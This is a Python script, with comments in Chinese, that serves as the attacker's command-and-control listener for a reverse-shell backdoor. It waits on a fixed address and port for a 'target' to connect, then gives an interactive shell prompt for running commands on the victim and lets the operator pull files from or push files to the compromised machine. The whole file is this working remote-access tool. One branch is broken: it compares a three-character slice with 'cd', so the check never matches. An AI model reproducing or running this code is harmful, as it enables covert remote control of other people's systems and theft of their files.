import socket
import json
import os

# 可靠地發送數據
def reliable_send(data):
    json_data = json.dumps(data)  # 將數據轉換為JSON格式（使用dumps而不是dump）
    target.send(json_data.encode())  # 使用Socket發送JSON格式的數據

# 可靠地接收數據
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        except ConnectionResetError:
            print("連接被重置，嘗試重新建立連接。")
            return None
        except Exception as e:
            print(f"接收數據時發生錯誤: {e}")
            return None


# 上傳文件到目標系統
def upload_file(filename):
    try:
        with open(filename, 'rb') as f:
            target.send(f.read())  # 讀取文件數據並發送到目標系統
    except Exception as e:
        print(f"上傳文件時發生錯誤: {e}")

# 從目標系統下載文件
def download_file(filename):
    try:
        with open(filename, 'wb') as f:
            target.settimeout(1)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)  # 將接收到的數據寫入文件
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
    except Exception as e:
        print(f"下載文件時發生錯誤: {e}")

# 與目標系統進行通信
def target_communication():
    while True:
        try:
            command = input('* Shell~%s: ' % str(ip))
            reliable_send(command)
            if command == 'quit':
                break
            elif command == 'clear':
                os.system('clear')
            elif command[:3] == 'cd':
                pass
            elif command[:8] == 'download':
                download_file(command[9:])
            elif command[:6] == 'upload':
                upload_file(command[7:])
            else:
                result = reliable_recv()
                if result is None:
                    break
                print(result)
        except Exception as e:
            print(f"與目標系統通信時發生錯誤: {e}")
            break


if __name__ == '__main__':
    try:
        # 建立一個TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # 綁定到特定的IP地址和端口
        sock.bind(('192.168.0.157', 5555))

        # 監聽來自客戶端的連接
        print('[+] Listening For The Incoming Connections...')
        sock.listen(5)

        # 接受客戶端的連接
        target, ip = sock.accept()
        print('[+] Target Connected From: ' + str(ip))

        # 與客戶端通信
        try:
            target_communication()
        except KeyboardInterrupt:
            print("\n程序被手動終止。")
            target.close()  # 關閉與客戶端的連接
            sock.close()    # 關閉服務器 socket

    except Exception as e:
        print(f"主程序中發生錯誤: {e}")
